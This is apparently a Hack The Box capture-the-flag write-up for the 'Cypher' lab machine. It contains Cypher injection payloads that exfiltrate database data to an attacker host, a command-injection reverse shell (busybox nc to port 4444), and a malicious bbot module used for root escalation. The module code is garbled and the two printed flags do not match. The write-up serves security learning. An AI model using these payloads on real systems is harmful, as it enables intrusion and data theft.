---
title: "HTB Cypher"
date: 2026-01-06 15:00:00 +1100
categories: [Hack The Box]
tags: [Neo4j, Cypher Injection, APOC, Command Injection, Java, JAR, jadx, RCE, Reverse Shell, Sudo, PrivEsc, bbot]
image:
  path: /assets/img/Cypher/icon.png
---


Cypher is a medium-difficulty Linux machine that requires exploiting a cypher injection vulnerability to bypass authentication on a login page. This grants users access to a custom web application to execute custom queries. A Java file is discovered by fuzzing the web application, revealing a command injection vulnerability that provides access to the machine as the `neo4j` user. A history file contains the credentials for the `graphasm` user, who has permission to execute `bbot` as `root` user. This privilege escalation is exploited by creating a custom module that allows executing commands.
# Nmap

```shell
└─$ scan 10.129.231.244
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-07 12:04 AEDT
Nmap scan report for 10.129.231.244
Host is up (0.32s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.32 seconds
```

# Feroxbuster

```shell
└─$ feroxbuster -u http://cypher.htb  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt        
                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cypher.htb/
 🚩  In-Scope Url          │ cypher.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      162l      360w     4562c http://cypher.htb/index
200      GET      162l      360w     4562c http://cypher.htb/
200      GET      126l      274w     3671c http://cypher.htb/login
200      GET      179l      477w     4986c http://cypher.htb/about
200      GET        3l      113w     8123c http://cypher.htb/bootstrap-notify.min.js
405      GET        1l        3w       31c http://cypher.htb/api/auth
200      GET       63l      139w     1548c http://cypher.htb/utils.js
307      GET        0l        0w        0c http://cypher.htb/demo => http://cypher.htb/login
307      GET        0l        0w        0c http://cypher.htb/api/ => http://cypher.htb/api/api
200      GET        7l     1223w    80496c http://cypher.htb/bootstrap.bundle.min.js
200      GET        2l     1293w    89664c http://cypher.htb/jquery-3.6.1.min.js
200      GET       12l     2173w   195855c http://cypher.htb/bootstrap.min.css
200      GET     7333l    24018w   208204c http://cypher.htb/vivagraph.min.js
200      GET      876l     4886w   373109c http://cypher.htb/logo.png
200      GET     5632l    33572w  2776750c http://cypher.htb/us.png
404      GET        1l        2w       22c http://cypher.htb/demos
307      GET        0l        0w        0c http://cypher.htb/api => http://cypher.htb/api/docs
301      GET        7l       12w      178c http://cypher.htb/testing => http://cypher.htb/testing/
200      GET       17l      139w     9977c http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar
404      GET        1l        2w       22c http://cypher.htb/democracy
404      GET        1l        2w       22c http://cypher.htb/demographics
404      GET        1l        2w       22c http://cypher.htb/apis

```

What stands out straight away is the `testing` directory, which contains a JAR archive. A JAR archive is just a ZIP file that contains Java code.

```shell
9977c http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar
```

Let’s get the file and then inspect it.

```shell
└─$ wget http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar

--2026-01-07 12:16:29--  http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar
Resolving cypher.htb (cypher.htb)... 10.129.231.244
Connecting to cypher.htb (cypher.htb)|10.129.231.244|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6556 (6.4K) [application/java-archive]
Saving to: ‘custom-apoc-extension-1.0-SNAPSHOT.jar’

custom-apoc-extension-1.0-SN 100%[==============================================>]   6.40K  --.-KB/s    in 0s      

2026-01-07 12:16:30 (1.10 GB/s) - ‘custom-apoc-extension-1.0-SNAPSHOT.jar’ saved [6556/6556]

                                                                                                                        
┌──(kali㉿kali)-[~/boxes/cypher]
└─$ jar tf custom-apoc-extension-1.0-SNAPSHOT.jar

META-INF/
META-INF/MANIFEST.MF
com/
com/cypher/
com/cypher/neo4j/
com/cypher/neo4j/apoc/
com/cypher/neo4j/apoc/CustomFunctions$StringOutput.class
com/cypher/neo4j/apoc/HelloWorldProcedure.class
com/cypher/neo4j/apoc/CustomFunctions.class
com/cypher/neo4j/apoc/HelloWorldProcedure$HelloWorldOutput.class
META-INF/maven/
META-INF/maven/com.cypher.neo4j/
META-INF/maven/com.cypher.neo4j/custom-apoc-extension/
META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.xml
META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.properties

```

We can use jadx.

```shell
└─$ /usr/bin/jadx -d /tmp/decompiled_cypher "$(pwd)/custom-apoc-extension-1.0-SNAPSHOT.jar"
(kali㉿kali)-[/tmp/decompiled_cypher]
└─$ tree .        
.
├── resources
│   ├── com
│   │   └── cypher
│   │       └── neo4j
│   │           └── apoc
│   │               ├── CustomFunctions$StringOutput.class
│   │               ├── CustomFunctions.class
│   │               ├── HelloWorldProcedure$HelloWorldOutput.class
│   │               └── HelloWorldProcedure.class
│   └── META-INF
│       ├── MANIFEST.MF
│       └── maven
│           └── com.cypher.neo4j
│               └── custom-apoc-extension
│                   ├── pom.properties
│                   └── pom.xml
└── sources
    └── com
        └── cypher
            └── neo4j
                └── apoc
                    ├── CustomFunctions.java
                    └── HelloWorldProcedure.java

15 directories, 9 files
                                                                                                                        
┌──(kali㉿kali)-[/tmp/decompiled_cypher]
└─$ 

```

From the output, it looks like there are two Java files. Let’s take a look at them.

```shell
└─$ cat sources/com/cypher/neo4j/apoc/CustomFunctions.java

package com.cypher.neo4j.apoc;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;
import org.neo4j.procedure.Description;
import org.neo4j.procedure.Mode;
import org.neo4j.procedure.Name;
import org.neo4j.procedure.Procedure;

/* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/CustomFunctions.class */
public class CustomFunctions {
    @Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)
    @Description("Returns the HTTP status code for the given URL as a string")
    public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
        if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://")) {
            url = "https://" + url;
        }
        String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
        System.out.println("Command: " + Arrays.toString(command));
        Process process = Runtime.getRuntime().exec(command);
        BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        StringBuilder errorOutput = new StringBuilder();
        while (true) {
            String line = errorReader.readLine();
            if (line == null) {
                break;
            }
            errorOutput.append(line).append("\n");
        }
        String statusCode = inputReader.readLine();
        System.out.println("Status code: " + statusCode);
        boolean exited = process.waitFor(10L, TimeUnit.SECONDS);
        if (!exited) {
            process.destroyForcibly();
            statusCode = "0";
            System.err.println("Process timed out after 10 seconds");
        } else {
            int exitCode = process.exitValue();
            if (exitCode != 0) {
                statusCode = "0";
                System.err.println("Process exited with code " + exitCode);
            }
        }
        if (errorOutput.length() > 0) {
            System.err.println("Error output:\n" + errorOutput.toString());
        }
        return Stream.of(new StringOutput(statusCode));
    }

    /* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/CustomFunctions$StringOutput.class */
    public static class StringOutput {
        public String statusCode;

        public StringOutput(String statusCode) {
            this.statusCode = statusCode;
        }
    }
}
                                                                                                                        
┌──(kali㉿kali)-[/tmp/decompiled_cypher]
└─$ cat sources/com/cypher/neo4j/apoc/HelloWorldProcedure.java

package com.cypher.neo4j.apoc;

import java.util.stream.Stream;
import org.neo4j.procedure.Description;
import org.neo4j.procedure.Mode;
import org.neo4j.procedure.Name;
import org.neo4j.procedure.Procedure;

/* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/HelloWorldProcedure.class */
public class HelloWorldProcedure {
    @Procedure(name = "custom.helloWorld", mode = Mode.READ)
    @Description("A simple hello world procedure")
    public Stream<HelloWorldOutput> helloWorld(@Name("name") String name) {
        String greeting = "Hello, " + name + "!";
        return Stream.of(new HelloWorldOutput(greeting));
    }

    /* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/HelloWorldProcedure$HelloWorldOutput.class */
    public static class HelloWorldOutput {
        public String greeting;

        public HelloWorldOutput(String greeting) {
            this.greeting = greeting;
        }
    }

```

In the line:

```shell
String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
```

We may be able to inject some commands, as it's taking a user-defined “URL” and putting it into a command.

Now the issue is we just have to find out where the application is calling this command.

Let’s go back to the login page.

![img](/assets/img/Cypher/1.png)

If I put a simple `'` as the username and password, it prompts an error.

```shell
HTTP/1.1 400 Bad Request
Server: nginx/1.24.0 (Ubuntu)
Date: Wed, 07 Jan 2026 01:37:28 GMT
Content-Length: 3432
Connection: keep-alive

Traceback (most recent call last):
  File "/app/app.py", line 142, in verify_creds
    results = run_cypher(cypher)
  File "/app/app.py", line 63, in run_cypher
    return [r.data() for r in session.run(cypher)]
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py", line 314, in run
    self._auto_result._run(
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 221, in _run
    self._attach()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 409, in _attach
    self._connection.fetch_message()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 178, in inner
    func(*args, **kwargs)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py", line 860, in fetch_message
    res = self._process_message(tag, fields)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py", line 370, in _process_message
    response.on_failure(summary_metadata or {})
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 245, in on_failure
    raise Neo4jError.hydrate(**metadata)
neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 55 (offset: 54))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = ''' return h.value as hash"
                                                       ^}

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/app.py", line 165, in login
    creds_valid = verify_creds(username, password)
  File "/app/app.py", line 151, in verify_creds
    raise ValueError(f"Invalid cypher query: {cypher}: {traceback.format_exc()}")
ValueError: Invalid cypher query: MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = ''' return h.value as hash: Traceback (most recent call last):
  File "/app/app.py", line 142, in verify_creds
    results = run_cypher(cypher)
  File "/app/app.py", line 63, in run_cypher
    return [r.data() for r in session.run(cypher)]
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/session.py", line 314, in run
    self._auto_result._run(
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 221, in _run
    self._attach()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/work/result.py", line 409, in _attach
    self._connection.fetch_message()
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 178, in inner
    func(*args, **kwargs)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt.py", line 860, in fetch_message
    res = self._process_message(tag, fields)
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_bolt5.py", line 370, in _process_message
    response.on_failure(summary_metadata or {})
  File "/usr/local/lib/python3.9/site-packages/neo4j/_sync/io/_common.py", line 245, in on_failure
    raise Neo4jError.hydrate(**metadata)
neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 55 (offset: 54))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = ''' return h.value as hash"
                                                       ^}

```

Let’s see what we can do. After doing some googling, I found we can enumerate table names.

[https://github.com/b4rdia/HackTricks/blob/master/pentesting-web/sql-injection/cypher-injection-neo4j.md](https://github.com/b4rdia/HackTricks/blob/master/pentesting-web/sql-injection/cypher-injection-neo4j.md)

We can use this input:

```shell
' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.30/?'+label AS b RETURN b//
```

And then if we start up a server, we can see the table names.

```shell
└─$ python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.231.244 - - [07/Jan/2026 12:48:43] "GET /?USER HTTP/1.1" 200 -
10.129.231.244 - - [07/Jan/2026 12:48:44] "GET /?HASH HTTP/1.1" 200 -
10.129.231.244 - - [07/Jan/2026 12:48:45] "GET /?DNS_NAME HTTP/1.1" 200 -
10.129.231.244 - - [07/Jan/2026 12:48:45] "GET /?SHA1 HTTP/1.1" 200 -
10.129.231.244 - - [07/Jan/2026 12:48:46] "GET /?SCAN HTTP/1.1" 200 -
10.129.231.244 - - [07/Jan/2026 12:48:46] "GET /?ORG_STUB HTTP/1.1" 200 -
10.129.231.244 - - [07/Jan/2026 12:48:47] "GET /?IP_ADDRESS HTTP/1.1" 20
```

```shell
' OR 1=1 WITH 1 as a MATCH (u:USER)-[r]->(h:SHA1) RETURN u.name + '->' + type(r) + '->' + h.value LOAD CSV FROM 'http://10.10.14.30:80/REL?'+u.name+':'+h.value AS b RETURN b//

' OR 1=1 WITH 1 as a MATCH (u:USER) RETURN u.name LOAD CSV FROM 'http://10.10.14.30:80/USER?'+u.name AS b RETURN b//

' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.30/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //

```

We can try to enumerate the database.

We can leak a username using:

```shell
' OR 1=1 MATCH (u:USER) UNWIND keys(u) AS p LOAD CSV FROM "http://10.10.14.30/?USER=" + p + ":" + toString(u[p]) AS l RETURN l //
```

And we can leak a hash using:

```shell
' OR 1=1 MATCH (n:SHA1) UNWIND keys(n) AS p LOAD CSV FROM "http://10.10.14.30/?SHA1=" + p + ":" + toString(n[p]) AS l RETURN l //

```

And we get the following:

```shell
└─$ python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.231.244 - - [07/Jan/2026 12:56:54] "GET /?USER=name:graphasm HTTP/1.1" 200 -
10.129.231.244 - - [07/Jan/2026 12:57:49] "GET /?SHA1=value:9f54ca4c130be6d529a56dee59dc2b2090e43acf HTTP/1.1" 200 -

```

However, it's not crackable, so let's try some other ways.

```shell
' return h.value as hash UNION return "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8" AS hash LIMIT 1;//
```

We can use the SHA1 hash of `password`.

And then put the password as `password`, and we get bypassed.

And we get put to the home screen.

![img](/assets/img/Cypher/2.png)

There is a drop-down menu that lists different queries we can use.

![img](/assets/img/Cypher/3.png)

Now that we are on the website and can build our own queries, we can just call the procedure from the query and inject a command. We can build the following command to test.

```shell
CALL custom.getUrlStatusCode('http://example.com; whoami') YIELD statusCode RETURN statusCode
```

And we get command execution.

![img](/assets/img/Cypher/4.png)

Let’s explain a few things.

1. **Why we can call the procedure from the query interface**

   * Custom procedures are **registered with Neo4j** when the database starts
   * Once registered, they can be called **from any Cypher query** (just like built-in functions)
   * The procedure `custom.getUrlStatusCode` becomes available to **any query that runs on this Neo4j instance**

2. The command injection

We can simply inject another command by putting a `;` after the URL, as the vulnerable code places our input into the command without sanitisation:

```shell
 String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
```

So it would end up being:

```bash
 String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + http://example.com; whoami};

```

# Revershell

We can use this command to get a rev shell.

```bash
CALL custom.getUrlStatusCode('http://example.com; busybox nc 10.10.14.30 4444 -e bash') YIELD statusCode RETURN statusCode
```

And we are on the box.

```bash
─$ nc -lvnp 4444                     
listening on [any] 4444 ...
connect to [10.10.14.30] from (UNKNOWN) [10.129.231.244] 51106
python3 -c 'import pty;pty.spawn("/bin/sh")'
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
neo4j@cypher:/$ ^Z

```

# Lateralmovement

If we check the history file, we can see a password.

```bash
neo4j@cypher:~/data/databases/neo4j$ history
    1  neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK

```

Let’s check for password reuse on the user on the box.

```bash
─$ ssh graphasm@cypher.htb
graphasm@cypher:~$ cat user.txt
4d1a46b2e3d1aba186b8ed5bfa96568
graphasm@cypher:~
```

# PrivEsc

If we run a `sudo -l`, we can run a command.

```bash
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
graphasm@cypher:~$ 

```

Let’s check the version.

```bash
aphasm@cypher:~$ bbot -v
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

```

In the home dir we can see a preset.

```bash
graphasm@cypher:~$ ls
bbot_preset.yml  user.txt
graphasm@cypher:~$ vi bbot_preset.yml 
graphasm@cypher:~$ 

```

We can add our own module.

```bash
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK

description: exploit
module_dirs:
  - .
modules:
  - exploit
~              
```

Now we can write the exploit code.

```bash
from bbot.modules.base import BaseModule
import os
os.system("cat /root/root.txt > /tmp/flag")
def MyModule(BaseModule):
watched_events = ["DNS_NAME"]
async def handle_event(self, event):
import os
os.system("cat /root/root.txt > /tmp/flag")
```

Now let’s run the whole thing.

```bash
sudo /usr/local/bin/bbot -t dummy.com -p bbot_preset.yml --event-types ROOT
```

And we can cat the flag.

```bash
graphasm@cypher:~$ cat user.txt
4d15a46b2e3d1aba186b8ed5bfa96568
graphasm@cypher:~$ cat
```

